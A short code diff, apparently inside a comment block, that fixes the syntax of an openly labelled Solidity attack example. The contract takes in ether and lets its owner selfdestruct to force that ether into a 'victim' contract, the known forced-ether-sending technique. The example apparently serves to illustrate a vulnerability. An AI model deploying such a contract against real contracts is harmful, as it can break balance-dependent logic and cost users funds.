@@ -13,19 +13,19 @@ contract maliciousContractExample {
   address private owner;
   
   constructor() {
-  owner = msg.sender
-  };
+  owner = msg.sender;
+  }
   
   // 1. So, we can easily send eth into this contract
    fallback() external payable {
-  };
+  }
   
   // 2. selfdestruct this contract with ether inside and transfer is to vulnerable contract
   
-  function(address victim) public {
+  function selfDestruct(address victim) public {
   require(msg.sender == owner, "caller isn't owner");
-  selfdestruct(victim);
-  };
+  selfdestruct(payable(victim));
+  }
   
 }
 */
